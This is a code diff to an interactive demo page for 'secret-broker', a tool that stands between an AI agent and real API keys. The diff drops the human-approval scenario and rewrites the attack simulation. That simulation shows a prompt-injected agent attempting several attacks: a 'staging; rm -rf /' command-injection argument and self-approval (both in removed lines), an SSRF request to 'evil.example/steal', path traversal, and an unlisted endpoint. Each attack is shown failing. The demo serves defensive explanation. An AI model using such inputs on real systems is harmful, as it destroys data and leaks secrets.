@@ -200,30 +200,6 @@
   .li.bad .b{color:var(--color-accent-2);border-color:oklch(68% 0.16 18 / .45)}
   .li.step .b{background:var(--color-accent);color:oklch(20% 0.03 60);border-color:transparent}
 
-  /* admin */
-  .admin{border:1px solid var(--color-rule);border-radius:16px;overflow:hidden;
-    background:radial-gradient(120% 70% at 85% -10%,var(--color-paper-emit),transparent 58%),var(--color-paper-2)}
-  .admin .hd{display:flex;align-items:center;gap:11px;padding:12px 15px;border-bottom:1px solid var(--color-rule)}
-  .admin .hd .ic{font-family:var(--font-mono);color:var(--color-accent);font-size:13px}
-  .admin .hd h4{font-family:var(--font-body);margin:0;font-size:14px;color:var(--color-ink);font-weight:600}
-  .admin .hd .sub{color:var(--color-mint);font-size:10.5px;margin-left:auto}
-  .queue{padding:15px;min-height:94px}
-  .qrow{display:flex;align-items:center;gap:12px;flex-wrap:wrap;border:1px solid var(--color-rule);
-    border-radius:12px;padding:13px;background:var(--color-paper);animation:pop .3s ease}
-  .qrow .meta{font-family:var(--font-mono);font-size:12.5px;color:var(--color-ink-2)}
-  .qrow .meta b{color:var(--color-ink)}.qrow .meta .args{color:var(--color-accent)}
-  .status{font-size:10.5px;padding:4px 10px;border-radius:999px;border:1px solid var(--color-rule-2)}
-  .status.pending{color:var(--color-accent);border-color:oklch(76% 0.17 50 / .4)}
-  .status.success{color:var(--color-mint);border-color:oklch(80% 0.16 150 / .4)}
-  .status.denied{color:var(--color-accent-2);border-color:oklch(68% 0.16 18 / .45)}
-  .qrow .sp{flex:1}
-  .btn-approve{background:var(--color-mint);color:oklch(22% 0.04 150);border-color:transparent;font-weight:600;padding:9px 15px}
-  .btn-deny{background:var(--color-accent-2);color:oklch(18% 0.03 20);border-color:transparent;font-weight:600;padding:9px 15px}
-  .btn-approve:disabled,.btn-deny:disabled{opacity:.4;cursor:not-allowed}
-  .queue .hint{color:var(--color-muted);font-size:13px;display:grid;place-items:center;height:64px;text-align:center}
-  .outbox{margin-top:11px;font-family:var(--font-mono);font-size:12px;color:var(--color-mint);width:100%;
-    background:oklch(80% 0.16 150 / .08);border:1px solid oklch(80% 0.16 150 / .3);border-radius:10px;padding:11px;display:none;white-space:pre-wrap}
-
   /* guards */
   .badges{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px}
   .badge{display:flex;align-items:center;gap:11px;border:1px solid var(--color-rule);border-radius:13px;padding:13px 15px;
@@ -265,18 +241,18 @@
     <p class="eyebrow"><span class="n">00</span> · secret-broker</p>
     <h1 class="hero__title">the agent never <em>sees</em> your keys.</h1>
     <p class="lede">a local gatekeeper stands between your ai agent and anything sensitive. the agent
-    holds only a throwaway token — <b>never your real keys</b> — reaches <b>only approved endpoints</b>,
-    and <b>cannot run a risky command</b> without your sign-off.</p>
+    holds only a throwaway token — <b>never your real keys</b> — and can reach <b>only approved
+    endpoints</b>. the broker injects the real key server-side and scrubs secrets from every response.</p>
 
     <div class="stats">
-      <div class="stat"><div class="stat__num">34</div><span class="stat__label">tests passing</span></div>
-      <div class="stat"><div class="stat__num">2</div><span class="stat__label">isolated channels</span></div>
-      <div class="stat"><div class="stat__num">0</div><span class="stat__label">keys exposed</span></div>
+      <div class="stat"><div class="stat__num">0</div><span class="stat__label">keys the agent sees</span></div>
+      <div class="stat"><div class="stat__num">1</div><span class="stat__label">file to run</span></div>
+      <div class="stat"><div class="stat__num">0</div><span class="stat__label">extra dependencies</span></div>
     </div>
   </header>
 
   <aside class="meter" aria-label="readout">
-    <p class="meter__label">rate · 20/min</p>
+    <p class="meter__label">keys · server-side</p>
     <div class="meter__bars" id="meterBars"></div>
     <p class="meter__label">default · deny</p>
   </aside>
@@ -288,7 +264,6 @@
 
     <div class="controls">
       <button class="scn" id="btnProxy">normal api call</button>
-      <button class="scn alt" id="btnTask">risky task</button>
       <button class="scn danger" id="btnAttack">injection attack</button>
       <button class="ghost" id="btnReset">reset</button>
       <label class="speed">speed
@@ -359,25 +334,9 @@
     </div>
   </section>
 
-  <!-- 02 · APPROVAL -->
+  <!-- 02 · GUARANTEES -->
   <section class="block">
-    <p class="eyebrow"><span class="n">02</span> · approval</p>
-    <h2>you approve the risky work</h2>
-    <div class="admin">
-      <div class="hd">
-        <span class="ic">&gt;_</span>
-        <h4>broker-approve</h4>
-        <span class="sub">x-admin-token ✔</span>
-      </div>
-      <div class="queue" id="queue">
-        <div class="hint">no pending requests. try “risky task” above — it lands here for your decision.</div>
-      </div>
-    </div>
-  </section>
-
-  <!-- 03 · GUARANTEES -->
-  <section class="block">
-    <p class="eyebrow"><span class="n">03</span> · guarantees</p>
+    <p class="eyebrow"><span class="n">02</span> · guarantees</p>
     <h2>the guards</h2>
     <div class="badges" id="badges">
       <div class="badge" data-k="strip"><span class="x">✓</span> client auth stripped</div>
@@ -385,8 +344,6 @@
       <div class="badge" data-k="redact"><span class="x">✓</span> secrets redacted</div>
       <div class="badge" data-k="allow"><span class="x">✓</span> allowlist · default deny</div>
       <div class="badge" data-k="traversal"><span class="x">✓</span> path-traversal / ssrf blocked</div>
-      <div class="badge" data-k="enum"><span class="x">✓</span> no arbitrary commands</div>
-      <div class="badge" data-k="approve"><span class="x">✓</span> approval gate</div>
     </div>
   </section>
 
@@ -401,11 +358,11 @@
   "use strict";
   const $ = id => document.getElementById(id);
   const packet = $("packet"), packetLbl = $("packetLbl");
-  const inspector = $("inspector"), logEl = $("log"), queue = $("queue");
+  const inspector = $("inspector"), logEl = $("log");
   const nodes = { agent:$("n-agent"), broker:$("n-broker"), upstream:$("n-upstream") };
   const POS = { agent:"16.6%", broker:"50%", upstream:"83.4%" };
   const REAL_KEY = "sk-proj-REAL-7h3Kx92bQ";
-  let running = false, speed = 1.2, revealed = false, decide = null;
+  let running = false, speed = 1.2, revealed = false;
 
   const speedEl = $("speed");
   speedEl.addEventListener("input", () => speed = parseFloat(speedEl.value));
@@ -458,7 +415,6 @@
     requestAnimationFrame(()=> packet.style.transition = "");
     inspector.innerHTML = `<div class="empty">pick a scenario to see the live request / response at each hop.</div>`;
     logEl.innerHTML = `<div class="empty">the step-by-step narration appears here.</div>`;
-    queue.innerHTML = `<div class="hint">no pending requests. try “risky task” above — it lands here for your decision.</div>`;
     document.querySelectorAll(".badge").forEach(b=>b.classList.remove("on"));
   }
 
@@ -488,7 +444,7 @@
 
     await move("broker", "request");
     setActive("broker");
-    log("broker checks the rules: service ✓, path ✓, method ✓, rate-limit ✓ (default-deny otherwise).", "good", "2");
+    log("broker checks the rules: service ✓, path ✓, method ✓ (default-deny otherwise).", "good", "2");
     badge("allow");
     await sleep(900);
 
@@ -539,70 +495,7 @@
     await sleep(600); hidePacket();
   }
 
-  // ---------- Scenario 2: task + approval ----------
-  function renderQueue(status, output){
-    const disabled = status !== "pending";
-    queue.innerHTML = `
-      <div class="qrow">
-        <span class="meta"><b>deploy_staging</b> <span class="args">args={target:"staging"}</span></span>
-        <span class="status ${status}" id="qstatus">${status}</span>
-        <span class="sp"></span>
-        <button class="btn-approve" id="qApprove" ${disabled?"disabled":""}>approve</button>
-        <button class="btn-deny" id="qDeny" ${disabled?"disabled":""}>deny</button>
-        <div class="outbox" id="qout" style="${output?'display:block':''}">${output||""}</div>
-      </div>`;
-    if (!disabled){
-      $("qApprove").onclick = () => decide && decide("approve");
-      $("qDeny").onclick    = () => decide && decide("deny");
-    }
-  }
-  function waitDecision(){ return new Promise(res => decide = res); }
-
-  async function scenarioTask(){
-    setActive("agent");
-    log("agent submits a <b>named</b> task (not an arbitrary command).", "step", "1");
-    inspect("agent → broker", [
-      {t:"POST /tasks/deploy_staging"},
-      {t:"X-Broker-Token: tok_agent_8f3k2j", c:"dim"},
-      {t:'{ "args": { "target": "staging" } }'},
-    ]);
-    await sleep(1200);
-
-    await move("broker", "submit");
-    setActive("broker");
-    log("args validated against the schema (target ∈ {staging, preview}). stored as <b>pending</b> — nothing runs.", "warn", "2");
-    badge("enum");
-    inspect("broker → agent", [
-      {t:'{ "request_id":"a1b2c3", "status":"pending" }', c:""},
-    ]);
-    renderQueue("pending");
-    await sleep(900);
-    hidePacket();
-
-    log("the agent can only wait. approval lives on a <b>separate port + token it doesn't have</b>.", "info", "3");
-    log("your move: click <b>approve</b> or <b>deny</b> in your terminal below.", "step", "!");
-
-    const choice = await waitDecision();
-    decide = null;
-    badge("approve");
-
-    if (choice === "approve"){
-      renderQueue("success", "$ python deploy.py staging\nwould deploy to staging ✓  (exit 0)");
-      log("you approved it. <b>only now</b> does the broker run the fixed command (no shell).", "good", "✓");
-      inspect("agent polls  GET /tasks/requests/a1b2c3", [
-        {t:'{ "status":"success",'},
-        {t:'  "stdout":"would deploy to staging" }', c:"good"},
-      ]);
-    } else {
-      renderQueue("denied");
-      log("you denied it. the task is dead — it <b>never executed</b>.", "bad", "✕");
-      inspect("agent polls  GET /tasks/requests/a1b2c3", [
-        {t:'{ "status":"denied", "stdout":"" }', c:"dim"},
-      ]);
-    }
-  }
-
-  // ---------- Scenario 3: attacks ----------
+  // ---------- Scenario 2: attacks ----------
   async function scenarioAttack(){
     log("simulating a <b>prompt-injected</b> agent trying to break out. watch everything fail closed.", "step", "!");
     await sleep(700);
@@ -614,41 +507,38 @@
     await move("broker", "malicious path", true);
     setActive("broker");
     log("<b>attack 1:</b> path traversal to escape the allowlist → cleaned & rejected.", "bad", "x");
-    badge("traversal"); badge("allow");
+    badge("traversal");
     inspect("broker response", [{t:"HTTP 400 · invalid path", c:"redact"}]);
     await sleep(1300); hidePacket(); await sleep(300);
 
     setActive("agent");
-    inspect("attack 2 · command injection via task arg", [
-      {t:'POST /tasks/deploy_staging'},
-      {t:'{ "args": { "target": "staging; rm -rf /" } }', c:"secret"},
+    inspect("attack 2 · an endpoint that isn't allow-listed", [
+      {t:"GET /proxy/openai/v1/secret-admin", c:"secret"},
     ]);
-    await move("broker", "evil arg", true);
+    await move("broker", "unlisted path", true);
     setActive("broker");
-    log("<b>attack 2:</b> shell metacharacters in an arg → fails enum validation; args run as argv, never a shell.", "bad", "x");
-    badge("enum");
-    inspect("broker response", [{t:"HTTP 400 · target must be one of [staging, preview]", c:"redact"}]);
+    log("<b>attack 2:</b> not in the allowlist → default-deny rejects it.", "bad", "x");
+    badge("allow");
+    inspect("broker response", [{t:"HTTP 403 · endpoint not allowed", c:"redact"}]);
     await sleep(1400); hidePacket(); await sleep(300);
 
     setActive("agent");
-    inspect("attack 3 · agent tries to approve itself", [
-      {t:"POST /tasks/requests/a1b2c3/approve"},
-      {t:"X-Broker-Token: tok_agent_8f3k2j", c:"dim"},
+    inspect("attack 3 · absolute url to another host (ssrf)", [
+      {t:"GET /proxy/openai/http://evil.example/steal", c:"secret"},
     ]);
-    await move("broker", "self-approve", true);
+    await move("broker", "ssrf attempt", true);
     setActive("broker");
-    log("<b>attack 3:</b> self-approval → that door doesn't exist on the agent port.", "bad", "x");
-    badge("approve");
+    log("<b>attack 3:</b> absolute url / redirect to another host → blocked; the broker only talks to the pinned host.", "bad", "x");
+    badge("traversal");
     inspect("broker response", [
-      {t:"HTTP 404 · no such route", c:"redact"},
-      {t:"// approval only on :8788 with the admin token", c:"good"},
+      {t:"HTTP 400 · invalid path", c:"redact"},
+      {t:"// redirects are never followed; host is pinned", c:"good"},
     ]);
     await sleep(1200); hidePacket();
     log("every attempt failed closed. the agent could only ever <b>ask</b> — never take.", "good", "✓");
   }
 
   $("btnProxy").addEventListener("click", () => run(scenarioProxy));
-  $("btnTask").addEventListener("click", () => run(scenarioTask));
   $("btnAttack").addEventListener("click", () => run(scenarioAttack));
   $("btnReset").addEventListener("click", () => { if (!running) reset(); });
 
